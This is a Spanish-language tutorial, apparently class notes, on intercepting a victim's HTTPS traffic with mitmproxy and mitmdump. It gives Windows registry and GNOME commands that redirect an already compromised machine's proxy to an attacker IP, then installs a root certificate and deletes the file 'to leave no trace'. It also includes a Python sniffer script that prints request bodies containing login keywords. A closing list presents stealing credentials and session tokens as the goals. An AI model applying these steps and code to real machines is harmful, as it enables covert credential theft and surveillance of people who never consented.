# ✔️ Introducción técnica (con negritas)

HTTPS cifra todas las comunicaciones entre cliente y servidor, impidiendo visualizar directamente información sensible como **credenciales**, **tokens**, **parámetros POST** o **cabeceras HTTP**.  
Para analizar este tráfico, es necesario utilizar un **proxy con capacidad de intercepción TLS (TLS interception)**. Herramientas como **mitmproxy** y su interfaz automatizable **mitmdump** permiten actuar como intermediario entre la máquina víctima y los servidores externos, descifrando y registrando todas las solicitudes.

La intercepción HTTPS requiere instalar en la víctima un **certificado raíz** generado por mitmproxy. De esta forma, el sistema confía en el proxy y le permite actuar como **autoridad certificadora (CA)**, lo que habilita el descifrado y análisis del tráfico cifrado.

Esta nota describe qué es un proxy, cómo funciona mitmproxy, cómo configurar el entorno atacante/víctima y cómo crear un **sniffer personalizado** mediante scripts de mitmdump.

---

# 🧱 1. ¿Qué es un proxy?

Un **proxy** es un intermediario entre un cliente (víctima) y un servidor (por ejemplo, Google).

El flujo normal es:

```
Cliente → Servidor
```

Pero con un proxy:

```
Cliente → Proxy → Servidor
```

El proxy puede:

- Ver el tráfico
- Modificarlo
- Redirigirlo
- Bloquearlo
- Guardarlo
- Automatizar tareas

En un ataque MITM (Man-in-the-Middle), nosotros actuamos como ese proxy.

---

# 🎭 2. ¿Qué es mitmproxy?

**mitmproxy** es un proxy interactivo diseñado para interceptar HTTP y HTTPS.  
Incluye tres herramientas:

|Herramienta|Descripción|
|---|---|
|**mitmproxy**|Interfaz en terminal interactiva|
|**mitmweb**|Interfaz web (la más cómoda para analizar tráfico)|
|**mitmdump**|Versión “headless” para automatizar y usar scripts Python|

Para esta clase, usaremos **mitmdump**, porque nos permite crear un **HTTPS Sniffer totalmente personalizado**.

# 🕵️‍♂️ 4. ¿Cómo funciona realmente la interceptación HTTPS?

Aquí ocurre la parte interesante.

HTTPS cifra todo entre cliente y servidor, pero **NO cifra contra proxies de confianza**.

✔️ Si logramos que la víctima confíe en nuestro certificado → su HTTPS deja de ser seguro  
✔️ Nosotros nos convertimos en “servidor de confianza”  
✔️ Podemos descifrar **todas** las solicitudes

El proceso:

1. Configuramos un proxy manual apuntando a nuestro equipo.    
2. La víctima intenta acceder a una web HTTPS.    
3. mitmproxy genera un **certificado falso** para ese dominio.    
4. El navegador detecta que no es legítimo → aparece error:  
    **“Tu conexión no es privada”**    
5. Instalamos nuestro certificado en el sistema víctima.    
6. El navegador _confía_ en nosotros.    
7. Todo el tráfico HTTPS pasa a ser visible en texto plano.

# 🧩 5. Configuración: Proxy + Certificado

Damos por hecho que:

✔️ Ya has comprometido la máquina víctima.  
✔️ Tienes privilegios suficientes para cambiar configuración.  
✔️ Puedes instalar certificados.

## 5.1 Iniciar mitmweb (equipo atacante)

```bash
./mitmweb
```

Esto abre la interfaz web (por defecto en `localhost:8081`).

## 5.2 En la víctima: acceder a `mitm.it`

Al principio verás:

> _"If you can see this, traffic is not passing through mitmproxy."_

Porque **todavía no has configurado el proxy**.

## 5.3 Configurar el proxy

### 🪟 Windows

```powershell
reg add "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Internet Settings" /v ProxyEnable /t REG_DWORD /d 1 /f

reg add "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Internet Settings" /v ProxyServer /t REG_SZ /d ATTACKER_IP:PORT /f
```

### 🐧 Linux (GNOME / Ubuntu)

```bash
gsettings set org.gnome.system.proxy mode 'manual'
gsettings set org.gnome.system.proxy.http host 'IP_ATACANTE'
gsettings set org.gnome.system.proxy.http port PORT
gsettings set org.gnome.system.proxy.https host 'IP_ATACANTE'
gsettings set org.gnome.system.proxy.https port PORT
```

## 5.4 Instalar el certificado

Ahora sí, al entrar en:  
👉 **[http://mitm.it](http://mitm.it/)**

Puedes descargar `mitmproxy-ca-cert.pem`.

En Windows:

- Instalar → Usuario actual
- Sin contraseña    
- “Colocar en un almacén de certificados”    
- Seleccionar:  
    ✔️ **Entidades de certificación raíz de confianza**

Eliminar el `.pem` para no dejar rastro.

✔️ MITM perfecto

# 🐍 7. Creación de un HTTPS Sniffer con **mitmdump**

`mitmdump` permite ejecutar scripts Python que se ejecutan en cada petición interceptada.

Ideal para:

- Guardar todo en logs    
- Detectar credenciales    
- Filtrar dominios específicos    
- Automatizar ataques    
- Crear payloads propios    
- Extraer tokens de sesión    

## 7.1 Instalación del módulo

```bash
pip install mitmproxy
```

## 7.2 Script `https_sniffer.py`

Aquí tienes una **versión corregida y mejorada**, porque tu script tenía varios errores (por ejemplo, definías `requests()` sin recibir `packet` ni el evento correcto).

La versión correcta usa el evento:

```python
def request(flow):
```

Aquí va la versión profesional:

```python
#!/usr/bin/env python3

from mitmproxy import http
from urllib.parse import urlparse

KEYWORDS = ["mail", "user", "pass", "login", "pwd"]


def has_keywords(data, keywords):
    return any(keyword.lower() in data.lower() for keyword in keywords)


def request(flow: http.HTTPFlow):
    """Se ejecuta cada vez que la víctima hace una petición HTTP/HTTPS."""

    url = flow.request.url
    method = flow.request.method
    parsed = urlparse(url)

    scheme = parsed.scheme
    domain = parsed.netloc
    path = parsed.path

    print(f"[+] {method} → {scheme}://{domain}{path}")

    # Intentamos leer el cuerpo de la petición (POST, PUT…)
    try:
        data = flow.request.get_text()
    except:
        data = ""

    if data and has_keywords(data, KEYWORDS):
        print("\n[🔥] Posibles credenciales detectadas:\n")
        print(data)
        print("=" * 60)
```

## 7.3 Ejecutar el sniffer

```bash
./mitmdump --script https_sniffer.py
```

Ahora:

✔️ Cada petición se muestra en terminal  
✔️ Si contiene credenciales → alerta  
✔️ Todo tráfico HTTPS descifrado gracias al proxy y certificado

# 🧠 8. ¿Qué puedes hacer con esto en un entorno ofensivo?

- Robar credenciales en **tiempo real**
- Capturar tokens de autenticación
- Leer APIs privadas
- Extraer sesiones de servicios web
- Hacer replay de peticiones POST
- Manipular tráfico
- Automatizar explotación de endpoints

Cuando un atacante controla la red + el certificado, la víctima pierde **toda privacidad**.
